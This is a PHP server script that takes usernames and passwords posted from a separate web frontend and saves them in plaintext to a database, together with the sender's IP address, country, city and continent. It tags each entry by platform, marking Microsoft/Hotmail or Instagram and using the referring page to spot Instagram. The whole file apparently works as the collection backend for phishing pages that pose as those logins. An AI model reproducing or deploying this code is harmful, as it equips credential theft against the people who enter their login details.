<?php
// Add these headers for CORS
header("Access-Control-Allow-Origin: https://your-vercel-app.vercel.app");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// For preflight OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require '../db_connection.php'; // Adjust path to your db_connection.php file

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Debug: Log all received data
    error_log("Received POST data: " . print_r($_POST, true));
    
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $country = isset($_POST['country']) ? $_POST['country'] : 'Unknown';
    $city = isset($_POST['city']) ? $_POST['city'] : 'Unknown';
    $continent = isset($_POST['continent']) ? $_POST['continent'] : 'Unknown';
    $ip_address = isset($_POST['ip']) ? $_POST['ip'] : $_SERVER['REMOTE_ADDR'];
    
    // Check if platform is specified, otherwise try to detect it
    $platform = isset($_POST['platform']) ? $_POST['platform'] : '';
    
    // If platform isn't explicitly set, try to detect from username or referer
    if (empty($platform)) {
        if (strpos($username, '(hotmail)') !== false || strpos($username, '(MS)') !== false) {
            // Already tagged as Microsoft
        } 
        elseif (strpos($username, '(IG)') !== false) {
            // Already tagged as Instagram
        }
        elseif (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'instagram') !== false) {
            // Add Instagram tag if not already present
            $username .= " (IG)";
        }
        elseif (!strpos($username, '(') && isset($_POST['source']) && $_POST['source'] == 'instagram') {
            // Add Instagram tag if source parameter indicates Instagram
            $username .= " (IG)";
        }
    }
    
    // Debug: Log the processed username
    error_log("Processed username: $username");

    // Validate the data (simple validation)
    if (empty($username) || empty($password)) {
        echo "Username and password are required";
        exit;
    }

    // SQL to insert data into users table
    $sql = "INSERT INTO users (username, password, country, city, continent, ip_address)
            VALUES (?, ?, ?, ?, ?, ?)";

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        die("Error preparing statement: " . $conn->error);
    }
    $stmt->bind_param("ssssss", $username, $password, $country, $city, $continent, $ip_address);

    if ($stmt->execute()) {
        echo "Login data saved successfully";
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
    $conn->close();
} else {
    echo "This script should be accessed via POST method.";
}
?> 